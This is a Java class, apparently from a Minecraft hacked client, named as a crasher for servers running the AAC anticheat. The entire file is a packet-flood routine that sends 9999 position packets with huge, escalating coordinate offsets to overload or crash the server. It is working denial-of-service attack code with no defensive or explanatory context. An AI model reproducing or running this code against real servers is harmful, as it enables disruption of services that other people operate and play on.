public class AacCrasher2 {
   public static void start() {
      for(int index2 = 0; index2 < 9999; ++index2) {
         Minecraft.getMinecraft().getConnection().sendPacket(new Position(Minecraft.getMinecraft().player.posX + (double)(9412 * index2), Minecraft.getMinecraft().player.getEntityBoundingBox().minY + (double)(9412 * index2), Minecraft.getMinecraft().player.posZ + (double)(9412 * index2), true));
      }

   }
}
